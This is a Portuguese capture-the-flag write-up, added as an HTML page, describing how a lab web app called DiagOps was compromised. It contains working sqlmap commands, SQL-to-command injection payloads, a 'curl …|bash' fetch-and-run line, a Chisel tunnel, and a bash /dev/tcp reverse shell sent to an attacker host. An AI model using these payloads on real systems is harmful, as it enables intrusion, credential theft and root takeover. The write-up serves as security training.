@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>DiagOps - HC // x404</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --black:    #000408;
+      --panel:    #010d1a;
+      --cyan:     #00d4ff;
+      --cyan2:    #00aacc;
+      --cyan-dim: #004455;
+      --orange:   #ff6600;
+      --white:    #e0f7ff;
+      --muted:    #3a7a8a;
+      --green:    #44ff88;
+      --purple:   #cc88ff;
+      --red:      #ff4466;
+      --ff-title: 'Orbitron', monospace;
+      --ff-mono:  'Share Tech Mono', monospace;
+      --glow-sm:  0 0 8px #00d4ff88;
+      --glow-md:  0 0 16px #00d4ffaa, 0 0 32px #00d4ff44;
+    }
+    html { scroll-behavior: smooth; }
+    body { background: var(--black); color: var(--white); font-family: var(--ff-mono); font-size: 15px; line-height: 1.8; overflow-x: hidden; }
+    .grid-bg { position: fixed; inset: 0; z-index: 0; pointer-events: none; background-image: linear-gradient(var(--cyan-dim) 1px, transparent 1px), linear-gradient(90deg, var(--cyan-dim) 1px, transparent 1px); background-size: 48px 48px; opacity: 0.15; mask-image: radial-gradient(ellipse 80% 80% at 50% 50%, black 40%, transparent 100%); }
+    .scanlines { position: fixed; inset: 0; z-index: 1; pointer-events: none; background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.07) 2px, rgba(0,0,0,0.07) 4px); }
+    .vignette { position: fixed; inset: 0; z-index: 2; pointer-events: none; background: radial-gradient(ellipse at center, transparent 50%, #000408bb 100%); }
+
+    nav { position: sticky; top: 0; z-index: 100; border-bottom: 1px solid var(--cyan-dim); background: rgba(0,4,8,0.94); backdrop-filter: blur(12px); }
+    .nav-inner { max-width: 900px; margin: 0 auto; padding: 0 32px; display: flex; align-items: stretch; justify-content: space-between; height: 52px; }
+    .nav-logo { font-family: var(--ff-title); font-size: 14px; font-weight: 700; color: var(--cyan); text-decoration: none; letter-spacing: 0.15em; text-shadow: var(--glow-sm); display: flex; align-items: center; border-right: 1px solid var(--cyan-dim); padding-right: 24px; }
+    .nav-logo .slash { color: var(--orange); }
+    .nav-back { display: flex; align-items: center; gap: 8px; color: var(--muted); text-decoration: none; font-size: 11px; letter-spacing: 0.14em; text-transform: uppercase; transition: color .2s; }
+    .nav-back:hover { color: var(--cyan); }
+    .nav-back::before { content: '←'; font-size: 14px; }
+
+    /* ── TOC STICKY ── */
+    .toc-wrap { position: sticky; top: 52px; z-index: 90; background: rgba(0,4,8,0.97); backdrop-filter: blur(12px); border-bottom: 1px solid var(--cyan-dim); border-top: 1px solid var(--cyan-dim); }
+    .toc { max-width: 900px; margin: 0 auto; padding: 10px 32px; display: flex; align-items: center; gap: 20px; }
+    .toc-title { font-family: var(--ff-title); font-size: 9px; font-weight: 700; letter-spacing: 0.15em; text-transform: uppercase; color: var(--orange); white-space: nowrap; }
+    .toc ol { list-style: none; counter-reset: toc; display: flex; flex-wrap: wrap; }
+    .toc li { counter-increment: toc; }
+    .toc a { color: var(--muted); text-decoration: none; font-size: 11px; display: flex; align-items: center; gap: 5px; padding: 4px 14px 4px 0; transition: color .2s; white-space: nowrap; }
+    .toc a::before { content: counter(toc, decimal-leading-zero) '.'; font-family: var(--ff-title); font-size: 9px; color: var(--cyan-dim); transition: color .2s; }
+    .toc a:hover { color: var(--cyan2); }
+    .toc a.active { color: var(--cyan); }
+    .toc a.active::before { color: var(--cyan); }
+
+    .page { position: relative; z-index: 10; max-width: 900px; margin: 0 auto; padding: 0 32px; }
+
+    .wu-header { padding: 64px 0 48px; border-bottom: 1px solid var(--cyan-dim); margin-bottom: 48px; }
+    .wu-meta { display: flex; flex-wrap: wrap; gap: 10px; align-items: center; margin-bottom: 20px; }
+    .wu-cat { font-family: var(--ff-title); font-size: 9px; font-weight: 700; letter-spacing: 0.15em; text-transform: uppercase; padding: 4px 12px; border: 1px solid; }
+    .cat-web { border-color: #00d4ff55; color: var(--cyan2); }
+    .wu-date { font-size: 12px; color: var(--muted); letter-spacing: 0.08em; }
+    .wu-diff { font-family: var(--ff-title); font-size: 9px; font-weight: 700; letter-spacing: 0.12em; padding: 4px 12px; border: 1px solid; }
+    .diff-medium { border-color: #ffaa0055; color: #ffaa00; }
+    .wu-title { font-family: var(--ff-title); font-size: clamp(24px, 4vw, 40px); font-weight: 900; letter-spacing: 0.04em; line-height: 1.2; color: var(--cyan); text-shadow: var(--glow-md); margin-bottom: 16px; }
+    .wu-desc { font-size: 14px; color: var(--muted); max-width: 640px; line-height: 1.8; margin-bottom: 24px; }
+    .wu-tags { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 28px; }
+    .tag { font-size: 11px; color: var(--muted); padding: 3px 10px; border: 1px solid #ffffff0f; background: rgba(255,255,255,0.02); }
+    .wu-infobar { display: flex; flex-wrap: wrap; gap: 2px; border: 1px solid var(--cyan-dim); }
+    .wu-infobar-item { padding: 10px 20px; background: var(--panel); display: flex; flex-direction: column; gap: 2px; flex: 1; min-width: 120px; }
+    .wi-label { font-size: 10px; color: var(--muted); letter-spacing: 0.1em; text-transform: uppercase; }
+    .wi-value { font-family: var(--ff-title); font-size: 13px; font-weight: 700; color: var(--cyan); letter-spacing: 0.06em; }
+
+    .attack-chain { display: flex; align-items: center; flex-wrap: wrap; gap: 0; margin: 32px 0 48px; }
+    .ac-step { background: var(--panel); border: 1px solid var(--cyan-dim); padding: 10px 14px; font-family: var(--ff-title); font-size: 9px; font-weight: 700; letter-spacing: 0.06em; color: var(--cyan2); text-align: center; flex: 1; min-width: 80px; line-height: 1.5; }
+    .ac-step.highlight { border-color: var(--orange); color: var(--orange); }
+    .ac-step.pivot { border-color: var(--purple); color: var(--purple); }
+    .ac-arrow { color: var(--cyan-dim); font-size: 16px; padding: 0 2px; flex-shrink: 0; }
+
+    .wu-content { max-width: 760px; }
+    .wu-content h2 { font-family: var(--ff-title); font-weight: 700; font-size: 17px; letter-spacing: 0.08em; text-transform: uppercase; color: var(--cyan); text-shadow: var(--glow-sm); margin: 56px 0 20px; padding-bottom: 10px; border-bottom: 1px solid var(--cyan-dim); display: flex; align-items: center; gap: 12px; }
+    .wu-content h2::before { content: '//'; color: var(--orange); font-size: 14px; }
+    .wu-content h3 { font-family: var(--ff-title); font-size: 13px; font-weight: 700; letter-spacing: 0.1em; color: var(--cyan2); margin: 32px 0 14px; }
+    .wu-content h3::before { content: '> '; color: var(--muted); }
+    .wu-content p { color: #8ab4be; margin-bottom: 14px; line-height: 1.85; }
+    .wu-content strong { color: var(--white); font-weight: 700; }
+    .wu-content em { color: #aaccdd; font-style: italic; }
+    .wu-content a { color: var(--cyan2); text-decoration: none; }
+    .wu-content a:hover { color: var(--cyan); text-shadow: var(--glow-sm); }
+    .wu-content code { font-family: var(--ff-mono); font-size: 13px; color: var(--orange); background: rgba(255,102,0,0.08); padding: 2px 7px; border: 1px solid rgba(255,102,0,0.2); }
+    .wu-content pre { background: #000d16; border: 1px solid var(--cyan-dim); border-left: 3px solid var(--cyan); margin: 20px 0; overflow-x: auto; }
+    .wu-content pre .lang-label { display: block; padding: 6px 16px; background: var(--panel); border-bottom: 1px solid var(--cyan-dim); font-family: var(--ff-title); font-size: 9px; font-weight: 700; letter-spacing: 0.15em; color: var(--cyan2); text-transform: uppercase; }
+    .wu-content pre code { display: block; padding: 18px 20px; background: transparent; border: none; color: #7ecfbf; font-size: 13px; line-height: 1.7; white-space: pre-wrap; word-break: break-all; }
+    .wu-content ul { padding-left: 0; margin-bottom: 14px; list-style: none; }
+    .wu-content ul li { color: #8ab4be; padding: 3px 0 3px 22px; position: relative; }
+    .wu-content ul li::before { content: '▸'; position: absolute; left: 0; color: var(--cyan); font-size: 10px; top: 6px; }
+    .wu-content figure { margin: 28px 0; }
+    .wu-content figure img { max-width: 100%; display: block; border: 1px solid var(--cyan-dim); transition: border-color .2s; }
+    .wu-content figure img:hover { border-color: var(--cyan2); }
+
+    .callout-flag { background: rgba(255,68,102,0.06); border: 1px solid rgba(255,68,102,0.3); border-left: 3px solid var(--red); padding: 16px 20px; margin: 20px 0; }
+    .callout-flag .cf-title { font-family: var(--ff-title); font-size: 10px; font-weight: 700; letter-spacing: 0.15em; color: var(--red); margin-bottom: 8px; }
+    .callout-flag p { color: #cc6688; margin: 0; }
+    .callout-flag code { color: var(--red); background: rgba(255,68,102,0.1); border-color: rgba(255,68,102,0.3); }
+    .callout-tip { background: rgba(68,255,136,0.04); border: 1px solid rgba(68,255,136,0.2); border-left: 3px solid var(--green); padding: 16px 20px; margin: 20px 0; }
+    .callout-tip .cf-title { font-family: var(--ff-title); font-size: 10px; font-weight: 700; letter-spacing: 0.15em; color: var(--green); margin-bottom: 8px; }
+    .callout-tip p { color: #44aa66; margin: 0; }
+    .callout-info { background: rgba(0,212,255,0.04); border: 1px solid rgba(0,212,255,0.2); border-left: 3px solid var(--cyan); padding: 16px 20px; margin: 20px 0; }
+    .callout-info .cf-title { font-family: var(--ff-title); font-size: 10px; font-weight: 700; letter-spacing: 0.15em; color: var(--cyan); margin-bottom: 8px; }
+    .callout-info p { color: #3a7a8a; margin: 0; }
+    .callout-info code { color: var(--cyan2); }
+    .callout-warn { background: rgba(255,102,0,0.05); border: 1px solid rgba(255,102,0,0.25); border-left: 3px solid var(--orange); padding: 16px 20px; margin: 20px 0; }
+    .callout-warn .cf-title { font-family: var(--ff-title); font-size: 10px; font-weight: 700; letter-spacing: 0.15em; color: var(--orange); margin-bottom: 8px; }
+    .callout-warn p { color: #aa6633; margin: 0; }
+
+    footer { border-top: 1px solid var(--cyan-dim); padding: 32px 0; margin-top: 40px; display: flex; justify-content: space-between; align-items: center; font-size: 11px; color: var(--muted); letter-spacing: 0.08em; }
+    .status-dot { width: 6px; height: 6px; background: var(--green); border-radius: 50%; box-shadow: 0 0 8px var(--green); display: inline-block; margin-right: 8px; animation: pulse 2s ease-in-out infinite; }
+    @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.4} }
+  </style>
+</head>
+<body>
+<div class="grid-bg"></div>
+<div class="scanlines"></div>
+<div class="vignette"></div>
+
+<nav>
+  <div class="nav-inner">
+    <a href="../index.html" class="nav-logo">0x404</a>
+    <a href="../index.html" class="nav-back">Voltar</a>
+  </div>
+</nav>
+
+<div class="toc-wrap">
+  <nav class="toc">
+    <div class="toc-title">// Índice</div>
+    <ol>
+      <li><a href="#recon">Information Gathering</a></li>
+      <li><a href="#sqli1">SQLi — Reset de Senha</a></li>
+      <li><a href="#token">Token & Acesso Admin</a></li>
+      <li><a href="#sqli2">SQLi — Command Injection</a></li>
+      <li><a href="#revshell">Reverse Shell</a></li>
+      <li><a href="#posexp">Pós-Exploração</a></li>
+      <li><a href="#privesc">Privesc — Livewire RCE</a></li>
+    </ol>
+  </nav>
+</div>
+
+<div class="page">
+
+  <header class="wu-header">
+    <div class="wu-meta">
+      <span class="wu-cat cat-web">Web App</span>
+      <span class="wu-date">JUL 2025</span>
+      <span class="wu-diff diff-medium">MEDIUM</span>
+    </div>
+    <h1 class="wu-title">DiagOps — HC</h1>
+    <p class="wu-desc">
+      Duas vulnerabilidades de SQL Injection encadeadas: a primeira no fluxo de reset de senha permite
+      extrair tokens e assumir a conta admin. A segunda injeta comandos no campo de atualização de diagnósticos,
+      resultando em RCE. Escalada via code review de app PHP com Livewire executando comandos como root.
+    </p>
+    <div class="wu-tags">
+      <span class="tag">SQL Injection</span>
+      <span class="tag">SQLMap</span>
+      <span class="tag">Token Hijack</span>
+      <span class="tag">Command Injection</span>
+      <span class="tag">Chisel</span>
+      <span class="tag">Livewire RCE</span>
+      <span class="tag">PHP</span>
+      <span class="tag">HackClub</span>
+    </div>
+    <div class="wu-infobar">
+      <div class="wu-infobar-item">
+        <span class="wi-label">Plataforma</span>
+        <span class="wi-value">HackClub</span>
+      </div>
+      <div class="wu-infobar-item">
+        <span class="wi-label">OS</span>
+        <span class="wi-value">Linux</span>
+      </div>
+      <div class="wu-infobar-item">
+        <span class="wi-label">Dificuldade</span>
+        <span class="wi-value" style="color:#ffaa00">Medium</span>
+      </div>
+      <div class="wu-infobar-item">
+        <span class="wi-label">IP Alvo</span>
+        <span class="wi-value">172.16.2.191</span>
+      </div>
+      <div class="wu-infobar-item">
+        <span class="wi-label">Data</span>
+        <span class="wi-value">23 JUL 2025</span>
+      </div>
+    </div>
+  </header>
+
+  <!-- ATTACK CHAIN -->
+  <div class="attack-chain">
+    <div class="ac-step">SQLi<br>forgot-password</div>
+    <span class="ac-arrow">→</span>
+    <div class="ac-step">Token<br>Hijack</div>
+    <span class="ac-arrow">→</span>
+    <div class="ac-step">Acesso<br>Admin</div>
+    <span class="ac-arrow">→</span>
+    <div class="ac-step">SQLi<br>CMDi</div>
+    <span class="ac-arrow">→</span>
+    <div class="ac-step pivot">Chisel<br>Tunnel</div>
+    <span class="ac-arrow">→</span>
+    <div class="ac-step">Livewire<br>RCE</div>
+    <span class="ac-arrow">→</span>
+    <div class="ac-step highlight">Root</div>
+  </div>
+
+  <div class="wu-content">
+
+    <h2 id="recon">Information Gathering</h2>
+
+    <h3>Portscan</h3>
+    <pre><span class="lang-label">bash</span><code>$ bash ~/tools/enumport/script.sh 172.16.2.191
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://diagops.hc/</code></pre>
+
+    <pre><span class="lang-label">bash</span><code>$ echo '172.16.2.191 diagops.hc' | sudo tee -a /etc/hosts</code></pre>
+
+    <h3>Enumeração Web</h3>
+    <p>Ao acessar a porta 80, encontramos apenas um formulário de login com opção de recuperação de senha.</p>
+
+    <figure><img src="imgs/2025-07-23_14-49.png" alt="Página inicial DiagOps" /></figure>
+
+    <pre><span class="lang-label">bash</span><code>$ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt \
+  -u http://diagops.hc/FUZZ -c -r -ac
+
+login            [Status: 200]
+logout           [Status: 200]
+logs             [Status: 200]
+forgot-password  [Status: 200]</code></pre>
+
+    <p>Sem outros vetores evidentes, inspecionamos o fluxo de recuperação de senha. Ao enviar um apóstrofo no parâmetro <code>email</code>, o servidor retornou HTTP 500 — indicando <strong>SQL Injection</strong>.</p>
+
+    <figure><img src="imgs/2025-07-23_15-00.png" alt="Erro 500 com apóstrofo no campo email" /></figure>
+
+    <h2 id="sqli1">SQL Injection — Reset de Senha</h2>
+
+    <p>Salvamos a requisição e executamos o SQLMap para confirmar e explorar a injeção:</p>
+
+    <pre><span class="lang-label">http request</span><code>POST /api/auth/forgot-password HTTP/1.1
+Host: diagops.hc
+Content-Type: application/json
+
+{"email":"string@string.com'"}</code></pre>
+
+    <pre><span class="lang-label">bash</span><code>$ sqlmap -r forgot.req --dbs --batch --level 5 --risk 3 --random-agent
+
+available databases [3]:
+[*] diagops
+[*] information_schema
+[*] performance_schema</code></pre>
+
+    <pre><span class="lang-label">bash</span><code>$ sqlmap -r forgot.req -D diagops --tables --batch --level 5 --risk 3
+
+Database: diagops
+[4 tables]
++--------------+
+| diagnostics  |
+| log_commands |
+| log_emails   |
+| users        |
++--------------+</code></pre>
+
+    <figure><img src="imgs/2025-07-23_15-57.png" alt="SQLMap enumerando tabelas do banco diagops" /></figure>
+
+    <pre><span class="lang-label">bash</span><code>$ sqlmap -r forgot.req -D diagops -T users --dump --batch \
+  --level 5 --risk 3 --random-agent --threads 10</code></pre>
+
+    <figure><img src="imgs/2025-07-23_15-59.png" alt="Dump da tabela users com hash e coluna token" /></figure>
+
+    <div class="callout-info">
+      <div class="cf-title">ℹ Insight</div>
+      <p>A quebra do hash do admin falhou. Identificamos uma coluna <code>token</code> na tabela <code>users</code> — possivelmente usada no fluxo de reset de senha.</p>
+    </div>
+
+    <h2 id="token">Token Hijack & Acesso Admin</h2>
+
+    <p>Disparamos um pedido de recuperação de senha via aplicação e, em seguida, extraímos o token gerado diretamente do banco:</p>
+
+    <pre><span class="lang-label">bash</span><code>$ sqlmap -r forgot.req -D diagops -T users -C token --dump --batch \
+  --level 5 --risk 3 --random-agent --threads 10
+
+Database: diagops
+Table: users
+[1 entry]
++----------------------------------------------+
+| token                                        |
++----------------------------------------------+
+| NTIwOWJmODE3ZjQ4MzY0MWYzOGY0MWY1NzA3MTU1YWM= |
++----------------------------------------------+</code></pre>
+
+    <p>Testamos o endpoint <code>/reset-password?token=</code> com o valor extraído. A mensagem mudou de "token perdido" para "token inválido ou expirado", confirmando que a aplicação processava o parâmetro. Repetimos o processo pegando o token válido e concluímos o reset:</p>
+
+    <figure><img src="imgs/2025-07-23_16-09.png" alt="Reset de senha com token extraído via SQLi" /></figure>
+    <figure><img src="imgs/2025-07-23_16-10.png" alt="Nova senha definida para o admin" /></figure>
+
+    <div class="callout-tip">
+      <div class="cf-title">✓ Acesso Admin Obtido</div>
+      <p>Credenciais redefinidas via token extraído por SQLi. Login efetuado como <code>admin</code>.</p>
+    </div>
+
+    <figure><img src="imgs/2025-07-23_16-28.png" alt="Dashboard da aplicação DiagOps como admin" /></figure>
+
+    <h2 id="sqli2">SQL Injection → Command Injection</h2>
+
+    <p>O dashboard exibe comandos pré-configurados (ping, traceroute, DNS lookup). Ao criar uma nova tarefa e monitorar as requisições, identificamos uma segunda SQLi no endpoint <code>/api/diagnostics/update/2</code> — especificamente no campo <code>name</code>.</p>
+
+    <figure><img src="imgs/2025-07-23_16-35.png" alt="Endpoint de atualização de diagnósticos" /></figure>
+
+    <div class="callout-warn">
+      <div class="cf-title">⚠ Técnica — SQLi para CMDi</div>
+      <p>Encerramos o valor do campo <code>name</code> e injetamos um UPDATE malicioso sobrescrevendo o campo <code>target_arg</code> com um comando OS, usando <code>--</code> para comentar o resto da query.</p>
+    </div>
+
+    <pre><span class="lang-label">json payload</span><code>{"name":"poc', target_arg = '127.0.0.1; id', description = 'poc' -- ",
+ "description":"Testes",
+ "target_arg":"127.0.0.1"}</code></pre>
+
+    <figure><img src="imgs/2025-07-23_16-52.png" alt="Payload SQLi injetando comando id" /></figure>
+
+    <p>Ao executar o diagnóstico atualizado, a resposta retornou a saída do comando <code>id</code> — RCE confirmado!</p>
+
+    <figure><img src="imgs/2025-07-23_16-57.png" alt="RCE confirmado com saída do comando id" /></figure>
+
+    <h2 id="revshell">Reverse Shell</h2>
+
+    <p>Geramos um payload de reverse shell via <a href="https://reverse-shell.sh" target="_blank">reverse-shell.sh</a>, servimos via Python HTTP server e injetamos via SQLi:</p>
+
+    <pre><span class="lang-label">json payload</span><code>{"name":"poc', target_arg = '127.0.0.1; curl 10.0.15.12/shell|bash', description = 'poc' -- ",
+ "description":"Testes",
+ "target_arg":"10.0.15.12"}</code></pre>
+
+    <figure><img src="imgs/2025-07-23_17-01.png" alt="Payload de reverse shell enviado" /></figure>
+    <figure><img src="imgs/2025-07-23_17-02.png" alt="Shell reversa recebida" /></figure>
+
+    <pre><span class="lang-label">bash</span><code>$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+$ export TERM=xterm</code></pre>
+
+    <div class="callout-flag">
+      <div class="cf-title">🚩 Flag 1 — User Flag</div>
+      <p>Obtida no diretório do usuário <code>diagsvc</code></p>
+    </div>
+
+    <figure><img src="imgs/2025-07-23_17-07.png" alt="User flag obtida" /></figure>
+
+    <h2 id="posexp">Pós-Exploração — Port Forwarding com Chisel</h2>
+
+    <p>Enumeramos os serviços internos com <code>ss -tnlp</code>:</p>
+
+    <pre><span class="lang-label">bash</span><code>diagsvc@ip-172-16-2-191:~$ ss -tnlp
+
+LISTEN  127.0.0.1:3306   ← MySQL
+LISTEN  127.0.0.1:8000   ← App PHP rodando como root!
+LISTEN  127.0.0.1:3000   ← App Node.js</code></pre>
+
+    <figure><img src="imgs/2025-07-23_17-08.png" alt="Serviços internos identificados" /></figure>
+
+    <pre><span class="lang-label">bash</span><code># Processo na porta 8000 rodando como root:
+root 1133 /usr/bin/php8.3 -S 127.0.0.1:8000 /root/webapp/vendor/laravel/...</code></pre>
+
+    <div class="callout-info">
+      <div class="cf-title">ℹ Chisel — Port Forwarding</div>
+      <p>O Chisel permite criar túneis TCP entre hosts. Usamos para expor a porta <code>8000</code> do alvo na nossa máquina.</p>
+    </div>
+
+    <pre><span class="lang-label">bash</span><code>$ wget http://10.0.15.12/chisel
+$ chmod +x chisel
+
+# No alvo:
+$ ./chisel client 10.0.15.12:8888 R:8000:127.0.0.1:8000</code></pre>
+
+    <p>Referência: <a href="https://github.com/jpillora/chisel" target="_blank">github.com/jpillora/chisel</a></p>
+
+    <figure><img src="imgs/2025-07-23_17-15.png" alt="Chisel estabelecendo o túnel" /></figure>
+    <figure><img src="imgs/2025-07-23_17-18.png" alt="Nova aplicação Laravel acessível via túnel" /></figure>
+
+    <p>Criamos um novo usuário na aplicação exposta, autenticamos e acessamos o dashboard. Sem vetores óbvios pela interface, partimos para análise do código-fonte em <code>/opt/webapp/app</code>.</p>
+
+    <figure><img src="imgs/2025-07-23_17-34.png" alt="Dashboard da aplicação PHP exposta" /></figure>
+
+    <h2 id="privesc">Privilege Escalation — Livewire RCE como Root</h2>
+
+    <p>No diretório <code>Livewire</code> encontramos o arquivo <code>MonitoringDashboard.php</code> com uma função <code>refreshMetric</code> crítica:</p>
+
+    <pre><span class="lang-label">php</span><code>if (strpos($metricName, 'cmd:') === 0) {
+    $command = substr($metricName, 4);
+    return function() use ($command) {
+        return shell_exec($command . ' 2>&1');
+    };
+}</code></pre>
+
+    <div class="callout-warn">
+      <div class="cf-title">⚠ Backdoor no Código</div>
+      <p>Qualquer parâmetro que inicie com <code>cmd:</code> é executado diretamente via <code>shell_exec</code> — com privilégios de <strong>root</strong>, pois é o processo pai da aplicação.</p>
+    </div>
+
+    <figure><img src="imgs/2025-07-23_17-36.png" alt="Código vulnerável no MonitoringDashboard.php" /></figure>
+
+    <p>Capturamos uma requisição legítima ao endpoint <code>/livewire/update</code> e modificamos o campo <code>params</code> no Burp Suite para validar o RCE:</p>
+
+    <pre><span class="lang-label">json payload</span><code>"params": ["cmd:id"]</code></pre>
+
+    <figure><img src="imgs/2025-07-23_17-37.png" alt="RCE confirmado como root via Livewire" /></figure>
+
+    <p>RCE como root confirmado! Enviamos o payload de reverse shell:</p>
+
+    <pre><span class="lang-label">json payload</span><code>["cmd:/usr/bin/bash -c 'bash -i >& /dev/tcp/10.0.15.12/9002 0>&1'"]</code></pre>
+
+    <figure><img src="imgs/2025-07-23_17-45.png" alt="Payload de shell reversa como root" /></figure>
+    <figure><img src="imgs/2025-07-23_17-52.png" alt="Shell root recebida" /></figure>
+
+    <div class="callout-flag">
+      <div class="cf-title">🚩 Flag 2 — Root Flag</div>
+      <p>Obtida em <code>/root/root.txt</code> com acesso privilegiado via Livewire RCE</p>
+    </div>
+
+    <figure><img src="imgs/2025-07-23_17-58.png" alt="Root flag obtida" /></figure>
+
+  </div>
+
+  <footer>
+    <div><span class="status-dot"></span>fstringuetta.github.io</div>
+    <span>© 2025 · fstringuetta</span>
+  </footer>
+
+</div>
+
+<script>
+  const sections = document.querySelectorAll('.wu-content h2[id]');
+  const tocLinks = document.querySelectorAll('.toc a');
+  const tocObserver = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(l => l.classList.remove('active'));
+        const active = document.querySelector(`.toc a[href="#${e.target.id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-10% 0px -80% 0px' });
+  sections.forEach(s => tocObserver.observe(s));
+
+  document.addEventListener('mousemove', e => {
+    const x = (e.clientX / window.innerWidth - 0.5) * 14;
+    const y = (e.clientY / window.innerHeight - 0.5) * 14;
+    document.querySelector('.grid-bg').style.transform = `translate(${x}px, ${y}px)`;
+  });
+</script>
+</body>
+</html>
